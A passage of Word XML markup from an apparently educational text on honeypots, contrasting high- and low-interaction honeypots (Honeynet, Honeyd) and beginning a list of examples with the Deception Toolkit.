          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ust be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ned for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>each honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>, wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can be exorb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y expens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ve.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>xa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:t>oneyn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74" w:line="288" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="66" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Low-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nterac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on honeypots</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>serv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ces</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>frequen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>reques</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>ers. S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hey</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>consu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>w resources,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ach</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>es can eas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y be hos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on one ph</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>cal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>have</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>short response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tim</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>requ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>red,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>redu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">'s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ecu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>xa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Honeyd.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7112"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Examp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">es of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oneypots-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="135"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Decept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">K was </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rst</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Open Source</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">eased </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1997. It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>s a co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on of Perl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>scr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ource</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">code </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
